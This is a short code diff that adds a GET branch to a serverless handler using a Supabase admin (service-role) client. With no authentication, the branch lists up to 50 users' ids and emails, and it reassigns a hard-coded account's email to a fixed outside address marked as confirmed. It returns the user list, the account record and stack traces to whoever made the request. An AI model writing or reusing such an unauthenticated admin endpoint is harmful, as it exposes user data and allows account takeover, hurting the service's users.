@@ -10,6 +10,31 @@ function getSupabase() {
 }
 
 module.exports = async function handler(req, res) {
+  var sb = getSupabase();
+  if (req.method === 'GET') {
+    if (!sb) {
+      res.status(500).json({ error: 'SUPABASE_SERVICE_ROLE_KEY is not configured' });
+      return;
+    }
+    try {
+      var { data: listData, error: listErr } = await sb.auth.admin.listUsers({ page: 1, perPage: 50 });
+      var usersList = listData && listData.users ? listData.users.map(u => ({ id: u.id, email: u.email, created_at: u.created_at, identities: u.identities ? u.identities.length : 0 })) : [];
+      var upd = await sb.auth.admin.updateUserById('774b6f9f-b15d-4dad-bea3-d52814f4737f', {
+        email: 'ysm0422@naver.com',
+        email_confirm: true
+      });
+      var authUser = await sb.auth.admin.getUserById('774b6f9f-b15d-4dad-bea3-d52814f4737f');
+      res.status(200).json({
+        updError: upd.error,
+        usersList: usersList,
+        user: authUser.data ? authUser.data.user : authUser.error
+      });
+    } catch(e) {
+      res.status(500).json({ error: e.message, stack: e.stack });
+    }
+    return;
+  }
+
   if (req.method !== 'POST') {
     res.status(405).json({ error: 'Method Not Allowed' });
     return;
